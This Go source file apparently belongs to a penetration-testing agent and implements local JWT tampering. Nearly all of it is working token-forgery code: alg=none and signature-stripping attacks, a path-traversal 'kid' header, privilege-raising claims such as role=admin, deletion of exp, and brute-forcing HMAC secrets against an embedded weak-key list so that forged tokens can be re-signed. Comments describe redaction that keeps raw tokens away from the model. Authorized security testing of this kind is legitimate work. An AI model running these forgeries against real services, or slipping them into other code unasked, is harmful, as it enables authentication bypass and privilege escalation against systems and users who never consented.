package redact

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"hash"
	"sort"
	"strings"
)

// JWT tampering for the pen-test agent, done entirely on the user's machine.
// The model names a token by vault ref and describes a mutation; this file
// decodes, mutates and re-encodes it locally. The model only ever gets back a
// new label plus header/claim NAMES and a short allow-list of non-secret
// values (see SafeJWTValues). The raw original and the forged token stay local.

// JWTMutation is what the agent may ask for.
type JWTMutation struct {
	SetAlg       string         `json:"set_alg,omitempty"`       // e.g. "none", "None", "HS256"
	SetHeader    map[string]any `json:"set_header,omitempty"`    // e.g. {"kid": "../../dev/null"}
	DeleteHeader []string       `json:"delete_header,omitempty"` // header names to drop
	SetClaims    map[string]any `json:"set_claims,omitempty"`    // e.g. {"role": "admin"}
	DeleteClaims []string       `json:"delete_claims,omitempty"` // e.g. ["exp"]
	Signature    string         `json:"signature,omitempty"`     // keep (default) | strip | empty | resign_weak
}

// JWTMutationResult is returned to the caller (the agent loop). Token is the
// forged token: it must be stored in the vault, never sent to the model.
type JWTMutationResult struct {
	Token        string         `json:"-"`
	HeaderNames  []string       `json:"header_names"`
	ClaimNames   []string       `json:"claim_names"`
	SafeValues   map[string]any `json:"safe_values,omitempty"`
	Applied      []string       `json:"applied"`
	WeakKeyFound bool           `json:"weak_key_found,omitempty"`
}

// ErrNotJWT is returned when the referenced value is not a JWT.
var ErrNotJWT = errors.New("value is not a JWT (expected header.payload.signature)")

// weakHMACKeys is a small local list of keys commonly left in HS256 apps.
// It never leaves the machine; a match is reported only as weak_key_found.
var weakHMACKeys = []string{
	"secret", "secretkey", "secret_key", "secret123", "supersecret", "mysecret", "s3cr3t",
	"jwt", "jwtsecret", "jwt_secret", "jwt-secret", "your_jwt_secret", "your-256-bit-secret",
	"your-secret-key", "changeme", "change_me", "password", "123456", "12345678", "qwerty",
	"key", "private", "test", "testing", "dev", "development", "default", "admin", "token", "",
}

// WeakHMACKeyCount is how many keys the local list holds (for docs/tests).
func WeakHMACKeyCount() int { return len(weakHMACKeys) }

// orderedObject keeps a JSON object's key order so untouched claims re-encode
// in their original order.
type orderedObject struct {
	keys []string
	vals map[string]json.RawMessage
}

func parseOrdered(b []byte) (*orderedObject, error) {
	dec := json.NewDecoder(bytes.NewReader(b))
	tok, err := dec.Token()
	if err != nil || tok != json.Delim('{') {
		return nil, errors.New("not a JSON object")
	}
	o := &orderedObject{vals: map[string]json.RawMessage{}}
	for dec.More() {
		kt, err := dec.Token()
		if err != nil {
			return nil, err
		}
		k, ok := kt.(string)
		if !ok {
			return nil, errors.New("bad key")
		}
		var v json.RawMessage
		if err := dec.Decode(&v); err != nil {
			return nil, err
		}
		if _, dup := o.vals[k]; !dup {
			o.keys = append(o.keys, k)
		}
		o.vals[k] = v
	}
	return o, nil
}

func (o *orderedObject) set(k string, v any) error {
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	if _, ok := o.vals[k]; !ok {
		o.keys = append(o.keys, k)
	}
	o.vals[k] = b
	return nil
}

func (o *orderedObject) del(k string) {
	if _, ok := o.vals[k]; !ok {
		return
	}
	delete(o.vals, k)
	for i, x := range o.keys {
		if x == k {
			o.keys = append(o.keys[:i], o.keys[i+1:]...)
			break
		}
	}
}

func (o *orderedObject) marshal() []byte {
	var b bytes.Buffer
	b.WriteByte('{')
	for i, k := range o.keys {
		if i > 0 {
			b.WriteByte(',')
		}
		kb, _ := json.Marshal(k)
		b.Write(kb)
		b.WriteByte(':')
		b.Write(o.vals[k])
	}
	b.WriteByte('}')
	return b.Bytes()
}

func (o *orderedObject) names() []string {
	out := append([]string(nil), o.keys...)
	sort.Strings(out)
	return out
}

func (o *orderedObject) str(k string) string {
	var s string
	_ = json.Unmarshal(o.vals[k], &s)
	return s
}

var b64 = base64.RawURLEncoding

func decodeSeg(s string) ([]byte, error) { return b64.DecodeString(strings.TrimRight(s, "=")) }

// SplitJWT returns the three segments of a compact JWT. "Bearer " is allowed.
func SplitJWT(tok string) (header, payload, sig string, err error) {
	tok = strings.TrimSpace(tok)
	if len(tok) > 7 && strings.EqualFold(tok[:7], "bearer ") {
		tok = strings.TrimSpace(tok[7:])
	}
	parts := strings.Split(tok, ".")
	if len(parts) != 3 {
		return "", "", "", ErrNotJWT
	}
	return parts[0], parts[1], parts[2], nil
}

func hmacFor(alg string) func() hash.Hash {
	switch strings.ToUpper(alg) {
	case "HS256":
		return sha256.New
	case "HS384":
		return sha512.New384
	case "HS512":
		return sha512.New
	}
	return nil
}

func signHMAC(alg, key, signingInput string) string {
	h := hmac.New(hmacFor(alg), []byte(key))
	h.Write([]byte(signingInput))
	return b64.EncodeToString(h.Sum(nil))
}

// findWeakKey reports which weak key (if any) verifies the token's HMAC
// signature. The key itself is never returned to the model.
func findWeakKey(alg, signingInput, sig string) (string, bool) {
	if hmacFor(alg) == nil {
		return "", false
	}
	for _, k := range weakHMACKeys {
		if hmac.Equal([]byte(signHMAC(alg, k, signingInput)), []byte(strings.TrimRight(sig, "="))) {
			return k, true
		}
	}
	return "", false
}

// MutateJWT applies m to tok and returns the forged token plus what may be
// shown to the model.
func MutateJWT(tok string, m JWTMutation) (*JWTMutationResult, error) {
	hs, ps, sig, err := SplitJWT(tok)
	if err != nil {
		return nil, err
	}
	hb, err := decodeSeg(hs)
	if err != nil {
		return nil, ErrNotJWT
	}
	pb, err := decodeSeg(ps)
	if err != nil {
		return nil, ErrNotJWT
	}
	hdr, err := parseOrdered(hb)
	if err != nil {
		return nil, fmt.Errorf("%w: header is not JSON", ErrNotJWT)
	}
	claims, err := parseOrdered(pb)
	if err != nil {
		return nil, fmt.Errorf("%w: payload is not JSON", ErrNotJWT)
	}
	origAlg := hdr.str("alg")
	res := &JWTMutationResult{}

	for _, k := range m.DeleteHeader {
		hdr.del(k)
		res.Applied = append(res.Applied, "delete_header:"+k)
	}
	for _, k := range sortedKeys(m.SetHeader) {
		if k == "alg" {
			continue // use set_alg
		}
		if err := hdr.set(k, m.SetHeader[k]); err != nil {
			return nil, err
		}
		res.Applied = append(res.Applied, "set_header:"+k)
	}
	if m.SetAlg != "" {
		if err := hdr.set("alg", m.SetAlg); err != nil {
			return nil, err
		}
		res.Applied = append(res.Applied, "set_alg:"+m.SetAlg)
	}
	for _, k := range m.DeleteClaims {
		claims.del(k)
		res.Applied = append(res.Applied, "delete_claim:"+k)
	}
	for _, k := range sortedKeys(m.SetClaims) {
		if err := claims.set(k, m.SetClaims[k]); err != nil {
			return nil, err
		}
		res.Applied = append(res.Applied, "set_claim:"+k)
	}

	newH := b64.EncodeToString(hdr.marshal())
	newP := b64.EncodeToString(claims.marshal())
	signingInput := newH + "." + newP
	alg := hdr.str("alg")

	mode := strings.ToLower(strings.TrimSpace(m.Signature))
	if mode == "" {
		if strings.EqualFold(alg, "none") {
			mode = "empty" // alg=none tokens carry an empty signature
		} else {
			mode = "keep"
		}
	}
	var newSig string
	switch mode {
	case "keep":
		newSig = sig // original signature: tests whether the server verifies at all
	case "strip":
		res.Token = signingInput // no trailing dot: "header.payload"
	case "empty":
		newSig = ""
	case "resign_weak":
		key, ok := findWeakKey(origAlg, hs+"."+ps, sig)
		if !ok {
			return nil, fmt.Errorf("resign_weak: none of the %d local weak keys verifies the original %s signature; try set_alg none or signature strip", len(weakHMACKeys), origAlg)
		}
		signAlg := alg
		if hmacFor(signAlg) == nil {
			signAlg = origAlg
			if err := hdr.set("alg", signAlg); err != nil {
				return nil, err
			}
			newH = b64.EncodeToString(hdr.marshal())
			signingInput = newH + "." + newP
		}
		newSig = signHMAC(signAlg, key, signingInput)
		res.WeakKeyFound = true
	default:
		return nil, fmt.Errorf("unknown signature mode %q (use keep, strip, empty or resign_weak)", m.Signature)
	}
	res.Applied = append(res.Applied, "signature:"+mode)
	if res.Token == "" {
		res.Token = signingInput + "." + newSig
	}
	res.HeaderNames = hdr.names()
	res.ClaimNames = claims.names()
	res.SafeValues = SafeJWTValues(hdr, claims)
	return res, nil
}

// safeHeaderKeys / safeClaimKeys are the only fields whose VALUES may be shown
// to the model: algorithm/type metadata, authorization-level claims and
// timestamps. Identifiers (sub, email, user_id), kid, jku/x5u and every other
// claim are name-only. A value is also withheld if it is long or looks like a
// secret itself.
var (
	safeHeaderKeys = map[string]bool{"alg": true, "typ": true, "cty": true}
	safeClaimKeys  = map[string]bool{"role": true, "roles": true, "scope": true, "scp": true, "admin": true, "is_admin": true, "isadmin": true, "aal": true,
		"exp": true, "iat": true, "nbf": true, "aud": true, "iss": true, "token_type": true}
)

// SafeJWTValues returns the allow-listed values (prefixed h. / c.).
func SafeJWTValues(hdr, claims *orderedObject) map[string]any {
	out := map[string]any{}
	add := func(prefix string, o *orderedObject, allow map[string]bool) {
		for _, k := range o.keys {
			if !allow[k] {
				continue
			}
			raw := o.vals[k]
			if len(raw) > 80 || Contains(string(raw)) {
				continue
			}
			var v any
			if json.Unmarshal(raw, &v) == nil {
				out[prefix+k] = v
			}
		}
	}
	add("h.", hdr, safeHeaderKeys)
	add("c.", claims, safeClaimKeys)
	if len(out) == 0 {
		return nil
	}
	return out
}

// InspectJWT returns names and safe values of a token without mutating it.
func InspectJWT(tok string) (*JWTMutationResult, error) {
	hs, ps, _, err := SplitJWT(tok)
	if err != nil {
		return nil, err
	}
	hb, err1 := decodeSeg(hs)
	pb, err2 := decodeSeg(ps)
	if err1 != nil || err2 != nil {
		return nil, ErrNotJWT
	}
	hdr, err1 := parseOrdered(hb)
	claims, err2 := parseOrdered(pb)
	if err1 != nil || err2 != nil {
		return nil, ErrNotJWT
	}
	return &JWTMutationResult{HeaderNames: hdr.names(), ClaimNames: claims.names(), SafeValues: SafeJWTValues(hdr, claims)}, nil
}

func sortedKeys(m map[string]any) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}
